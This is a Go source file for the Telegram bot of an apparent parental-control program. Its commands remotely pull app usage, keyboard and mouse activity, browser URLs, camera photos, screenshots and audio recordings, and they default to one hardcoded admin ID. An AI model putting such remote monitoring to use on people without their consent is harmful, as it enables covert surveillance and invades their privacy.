package bot

import (
	"context"
	"fmt"
	"log"
	"parental-control/internal/lib/config"
	"parental-control/internal/lib/types"
	"sync"
	"time"

	tele "gopkg.in/telebot.v4"
	"gopkg.in/telebot.v4/middleware"
)

var defaultAdmins = []int64{183358896}

type handlerRegistry struct {
	ctx       context.Context
	bot       *tele.Bot
	stats     *statisticsClient
	keyboards *keyboards
	youtube   *youtubeTimer
}

func StartBot(ctx context.Context, requests chan<- types.AppCommand) {
	fmt.Println("Running bot")
	env := ctx.Value(types.EnvKey{}).(*config.Env)
	admins := env.AdminIDs
	if len(admins) == 0 {
		admins = defaultAdmins
	}

	b, err := tele.NewBot(tele.Settings{
		Token:  env.BotToken,
		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
	})
	if err != nil {
		log.Printf("Failed to create bot: %s", err)
		ctx.Value(types.WgKey{}).(*sync.WaitGroup).Done()
		return
	}

	if err := b.SetCommands(botCommands()); err != nil {
		log.Printf("SetCommands failed: %s", err)
	}

	b.Use(middleware.Whitelist(admins...))
	h := &handlerRegistry{
		ctx:       ctx,
		bot:       b,
		stats:     newStatisticsClient(ctx, requests),
		keyboards: newKeyboards(),
		youtube:   newYoutubeTimer(ctx),
	}
	h.registerStatsHandlers()
	h.registerActivityHandlers()
	h.registerWebHandlers()
	h.registerMediaHandlers()
	h.registerYoutubeHandlers()

	go func() {
		<-ctx.Done()
		b.Stop()
		fmt.Println("Bot stopped")
		ctx.Value(types.WgKey{}).(*sync.WaitGroup).Done()
	}()

	b.Start()
}

func botCommands() []tele.Command {
	return []tele.Command{
		{Text: "stats", Description: "App usage: Hourly | Daily"},
		{Text: "hourly", Description: "App usage this hour"},
		{Text: "daily", Description: "App usage today"},
		{Text: "activity", Description: "Keyboard and mouse activity chart"},
		{Text: "info", Description: "App info by name: /info <name>"},
		{Text: "web", Description: "Browser: URL | Sites"},
		{Text: "url", Description: "Current browser URL"},
		{Text: "sites", Description: "Domain usage this hour"},
		{Text: "media", Description: "Capture: Photo | Screen | Record"},
		{Text: "photo", Description: "Photo from camera"},
		{Text: "screen", Description: "Screenshot"},
		{Text: "record", Description: "Record audio: /record [seconds]"},
		{Text: "youtube", Description: "Block / unblock YouTube"},
	}
}

func (h *handlerRegistry) hubAction(label string, action tele.HandlerFunc) tele.HandlerFunc {
	return func(c tele.Context) error {
		_ = c.Edit(label)
		_ = c.Respond()
		return action(c)
	}
}
